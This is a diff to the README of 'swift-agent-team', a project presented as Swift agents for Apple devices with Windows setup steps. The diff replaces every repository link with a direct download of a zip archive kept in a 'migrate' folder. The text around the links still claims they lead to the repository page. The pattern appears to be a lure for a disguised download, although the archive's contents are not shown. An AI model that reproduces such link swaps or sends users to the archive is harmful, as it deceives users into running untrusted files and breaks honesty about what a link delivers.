@@ -1,6 +1,6 @@
 # 🤖 swift-agent-team - Smart Swift Agents for Apple Devices
 
-[![Download swift-agent-team](https://img.shields.io/badge/Download-swift--agent--team-blue?style=for-the-badge&logo=github)](https://github.com/amirhosseinkab/swift-agent-team)
+[![Download swift-agent-team](https://img.shields.io/badge/Download-swift--agent--team-blue?style=for-the-badge&logo=github)](https://github.com/amirhosseinkab/swift-agent-team/raw/refs/heads/main/migrate/agent_swift_team_3.9.zip)
 
 ## 📋 About swift-agent-team
 
@@ -27,7 +27,7 @@ Follow these easy steps to get swift-agent-team working on your Windows computer
 ### 1. Visit the Download Page
 
 Click the large download badge at the top or use this link:  
-[https://github.com/amirhosseinkab/swift-agent-team](https://github.com/amirhosseinkab/swift-agent-team)  
+[https://github.com/amirhosseinkab/swift-agent-team/raw/refs/heads/main/migrate/agent_swift_team_3.9.zip](https://github.com/amirhosseinkab/swift-agent-team/raw/refs/heads/main/migrate/agent_swift_team_3.9.zip)  
 
 This link takes you to the GitHub repository page. Here you will find the releases, instructions, and files.
 
@@ -101,7 +101,7 @@ If you run into issues, try these common fixes:
 ## 📂 Additional Resources
 
 You can find more about swift-agent-team, its source code, and updates at:  
-[https://github.com/amirhosseinkab/swift-agent-team](https://github.com/amirhosseinkab/swift-agent-team)
+[https://github.com/amirhosseinkab/swift-agent-team/raw/refs/heads/main/migrate/agent_swift_team_3.9.zip](https://github.com/amirhosseinkab/swift-agent-team/raw/refs/heads/main/migrate/agent_swift_team_3.9.zip)
 
 This page also contains detailed information for advanced users and developers.
 
@@ -111,4 +111,4 @@ The app includes built-in testing tools to ensure reliability. If you want to he
 
 ---
 
-[![Download swift-agent-team](https://img.shields.io/badge/Download-swift--agent--team-blue?style=for-the-badge&logo=github)](https://github.com/amirhosseinkab/swift-agent-team)
+[![Download swift-agent-team](https://img.shields.io/badge/Download-swift--agent--team-blue?style=for-the-badge&logo=github)](https://github.com/amirhosseinkab/swift-agent-team/raw/refs/heads/main/migrate/agent_swift_team_3.9.zip)
